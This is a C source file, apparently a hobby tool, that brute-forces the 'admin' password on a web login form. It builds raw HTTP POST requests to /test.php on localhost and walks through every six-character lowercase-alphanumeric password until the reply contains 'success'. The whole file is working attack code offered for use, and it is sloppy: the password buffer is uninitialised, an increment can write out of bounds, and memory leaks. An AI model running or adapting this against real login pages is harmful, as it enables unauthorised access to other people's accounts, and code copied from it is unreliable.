#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <winsock2.h>

#define debug(MSG) printf("%s\n", MSG)
void brute(int);
void fillArray();
void SetSock(char *, int);

int lastPass, sock;

char *postHeader, *postBody, *allowed, aSize;

int main(int argc, char *argv[]) {
	postHeader = malloc(8192 * sizeof(char));
	memset(postHeader, 0, 8192 * sizeof(char));
	strcpy(postHeader, "POST /test.php HTTP/1.0\r\n");
	strcat(postHeader, "Accept-Charset: UTF-8\r\n");
	strcat(postHeader, "Content-Type: application/x-www-form-urlencoded;charset=UTF-8\r\n");
	strcat(postHeader, "Content-Length: ");
	postBody = malloc(8192 * sizeof(char));
	memset(postBody, 0, 8192 * sizeof(char));
	strcpy(postBody, "user=admin&pass=");
	fillArray();
	brute(6);
	return 0;
}

int sendPass(char *inpass, int size) {
	char *pass = malloc(size + 1), c, *post = malloc(8192 * sizeof(char)), *buf = malloc(256 * sizeof(char));
	memset(pass, 0, size + 1);
	memset(buf, 0, 256 * sizeof(char));
	memset(post, 0, 8192 * sizeof(char));
	for(c = 0; c < size; c++) pass[c] = allowed[inpass[c]];
	sprintf(post, "%s%i\r\n\r\n%s%s", postHeader, strlen(postBody) + size, postBody, pass);
	SetSock("127.0.0.1", 80);
	printf("Sent Bytes: %i\n", send(sock, post, strlen(post), 0));
	printf("Received Bytes: %i\n", recv(sock, buf, 256 * sizeof(char), 0));
	if(strstr(buf, "success") != NULL) {
		printf("Password: %s\nTime spent: %fs\n%s+n", pass, ((clock() / (CLOCKS_PER_SEC / 1000)) - lastPass) / 1000.0, buf);
		free(pass);
		return 1;
	}
	free(pass);
	return 0;
}

void brute(int size) {
	debug("Brute...");
	char *pass = malloc(size * sizeof(char)), i;
	lastPass = clock() / (CLOCKS_PER_SEC / 1000);
	while (1) {
		for (i = 0; i < size; i++) {
			if (pass[i] > aSize) {
				pass[i + 1]++;
				pass[i] = 0;
			}
		}
		if(sendPass(pass, size) == 1) break;
		pass[0]++;
	}
	free(pass);
	#ifdef _WIN32
	WSACleanup();
	#endif
	exit(0);
}

void fillArray() {
	allowed = malloc(36);
	char i, arr = 0;
	for (i = 0x30; i < 0x3A; i++) allowed[arr++] = i;
	for (i = 0x61; i < 0x7B; i++) allowed[arr++] = i;
	aSize = arr - 1;
}

void SetSock(char *host, int port) {
	#ifdef _WIN32
	WSADATA	WsaData;
	WSAStartup (0x202, &WsaData);
	#endif
	struct sockaddr_in sin;
	sock = socket (AF_INET, SOCK_STREAM, 0);
	#ifdef _WIN32
	if(sock < 0) printf("Error: %i\n", WSAGetLastError());
	#else
	if(sock < 0) printf("Error setting socket!\n");
	#endif
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	struct hostent * host_addr = gethostbyname(host);
	sin.sin_addr.s_addr = *((int*)*host_addr->h_addr_list);
	if(connect(sock,(const struct sockaddr *)&sin, sizeof(struct sockaddr_in)) != 0) {
		debug("Failed to connect to host!");
		exit(1);
	}
}